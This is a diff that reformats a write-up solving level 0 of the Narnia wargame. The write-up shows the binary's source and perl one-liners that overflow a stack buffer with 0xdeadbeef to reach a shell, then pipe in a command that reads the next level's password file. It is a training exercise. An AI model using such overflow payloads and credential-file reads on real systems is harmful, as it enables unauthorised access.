@@ -21,11 +21,15 @@ Passwords for each level are stored in /etc/mygame_pass/
 
 So let's try reading the password without any additional work.
 -> cat /etc/narnia_pass/narnia1
+
+narnia0@melinda:/narnia$ cat /etc/narnia_pass/narnia1
 cat: /etc/narnia_pass/narnia1: Permission denied
+narnia0@melinda:/narnia$ 
 
 Well that didn't work, so lets check out the challenge next. 
 Notice all the different files and find the level 0 binary.
 -> ls
+
 narnia0@melinda:/narnia$ ls
 narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
 narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
@@ -34,6 +38,7 @@ narnia0@melinda:/narnia$
 
 I start by checking what the file does
 -> ./narnia0
+
   narnia0@melinda:/narnia$ ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: AAAA %p
@@ -44,6 +49,7 @@ I start by checking what the file does
 
 Well that's interesting that it did something weird with %p. Now let's check the source code.
 -> cat narnia0.c
+
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -83,6 +89,7 @@ From inspecting the code we can see that the stack looks something like this:
   
 Alright now that I know this let's try some crafted input.
 -> perl -e 'print "A"x20 . "BBBB"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "BBBB"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
@@ -104,6 +111,7 @@ It's confirmed that i can overwrite the buffer.
 
  Now let's try it with deadbeef in there.
 -> perl -e 'print "A"x20 . "deadbeef"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "deadbeef"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAdead
@@ -115,6 +123,7 @@ Well that didn't work, because scanf is accepting string characters. So now we n
 in so that it will display 0xdeadbeef. Remember that you also have to craft the input to be little endian (I think of this
 as the input has to be spelled backwards).
 -> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
@@ -124,6 +133,7 @@ as the input has to be spelled backwards).
 Well that's weird I didn't get a shell, but the WAY OFF!!!! didn't show. At this point I realized that the /bin/sh needed
 an input to follow the system command. So then I added more input onto the end.
 -> perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
@@ -132,6 +142,7 @@ an input to follow the system command. So then I added more input onto the end.
 
 Still no solution. Now I want to create a situation where the program does something unintentional.
 -> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"x1100 . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde"x1100 . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
@@ -157,6 +168,7 @@ Still no solution. Now I want to create a situation where the program does somet
 Well that was useful, now lets whittle it down so that the /bin/sh command takes the correct input.
 All I should have to do now is remove the extra bytes.
 -> perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "B"x4072 . "cat /etc/narnia_pass/narnia1"' | ./narnia0
+
   narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "B"x4072 . "cat /etc/narnia_pass/narnia1"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
